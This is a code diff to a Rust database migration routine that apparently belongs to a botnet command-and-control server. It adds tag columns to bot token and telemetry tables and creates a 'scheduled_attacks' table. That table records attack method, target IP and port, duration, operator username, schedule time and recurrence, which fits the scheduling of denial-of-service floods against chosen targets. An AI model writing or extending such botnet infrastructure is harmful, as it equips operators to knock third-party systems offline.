@@ -136,6 +136,22 @@ async fn run_migrations(pool: &DbPool) -> Result<()> {
         );
         CREATE INDEX IF NOT EXISTS idx_pending_commands_bot_id ON pending_commands(bot_id);
         "#),
+        (2, r#"
+        ALTER TABLE bot_tokens ADD COLUMN tags TEXT DEFAULT '';
+        ALTER TABLE bot_telemetry ADD COLUMN tags TEXT DEFAULT '';
+        CREATE TABLE IF NOT EXISTS scheduled_attacks (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            method TEXT NOT NULL,
+            target_ip TEXT NOT NULL,
+            target_port INTEGER NOT NULL,
+            duration INTEGER NOT NULL,
+            username TEXT NOT NULL,
+            schedule_time DATETIME NOT NULL,
+            recurrence TEXT,
+            status TEXT DEFAULT 'pending',
+            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+        );
+        "#),
     ];
     for (version, sql) in migrations {
         if version > current_version {
